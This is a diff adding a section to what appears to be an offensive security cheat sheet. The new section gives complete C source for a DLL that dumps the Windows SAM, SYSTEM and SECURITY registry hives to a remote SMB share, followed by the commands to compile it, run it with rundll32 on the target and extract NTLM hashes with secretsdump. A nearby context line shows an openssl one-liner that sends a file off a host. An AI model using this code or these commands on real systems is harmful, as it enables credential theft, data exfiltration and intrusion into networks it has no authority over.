@@ -1169,3 +1169,66 @@ Generate a certificate and key first.<br />
 
 `openssl s_server -quiet -tls1_2 -cipher HIGH -key svrkey.pem -cert svrcert.pem -accept 443 -naccept 1 < <(cat file.bin | base64)`
 
+## >> Reg.exe DLL equivalent to dump registry hashes
+
+Compile your own DLL to dump the SAM, SYSTEM and SECURITY keys, which can be used with secretsdump.py to get NTLM hashes.  Performs the equivalent of:<br />
+`reg save hklm\sam sam`<br />
+`reg save hklm\system system`<br />
+`reg save hklm\security security`<br />
+
+**Create a DLL regsave.dll from source regsave.c**
+
+```c
+#include <windows.h>
+
+void CALLBACK RegSave(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
+
+void CALLBACK RegSave(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
+   // set your export paths here
+   LPCWSTR wsSam = L"\\\\192.168.1.242\\upload\\sam";
+   LPCWSTR wsSystem = L"\\\\192.168.1.242\\upload\\system";
+   LPCWSTR wsSecurity = L"\\\\192.168.1.242\\upload\\security";
+   HANDLE hToken;
+   TOKEN_PRIVILEGES tp;
+   LUID luid;
+   HKEY hKey;
+
+   if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+   {
+      if(LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &luid))
+      {
+         tp.PrivilegeCount = 1;
+         tp.Privileges[0].Luid = luid;
+         tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+         if(AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL))
+         {
+            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
+            {
+               RegSaveKeyW(hKey, wsSam, NULL);
+               RegCloseKey(hKey);
+            }
+            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
+            {
+               RegSaveKeyW(hKey, wsSystem, NULL);
+               RegCloseKey(hKey);
+            }
+            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SECURITY", 0, NULL, REG_OPTION_BACKUP_RESTORE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
+            {
+               RegSaveKeyW(hKey, wsSecurity, NULL);
+               RegCloseKey(hKey);
+            }
+         }
+      }
+   }
+}
+```
+
+Compile the DLL.<br />
+`i686-w64-mingw32-gcc -shared -Wl,--kill-at regsave.c -o regsave.dll`
+
+Execute the exported function on the target host.<br />
+`rundll32.exe regsave.dll,RegSave`
+
+On Linux, recover the hashes from the exported files.<br />
+`secretsdump.py -system system -sam sam -security security LOCAL`
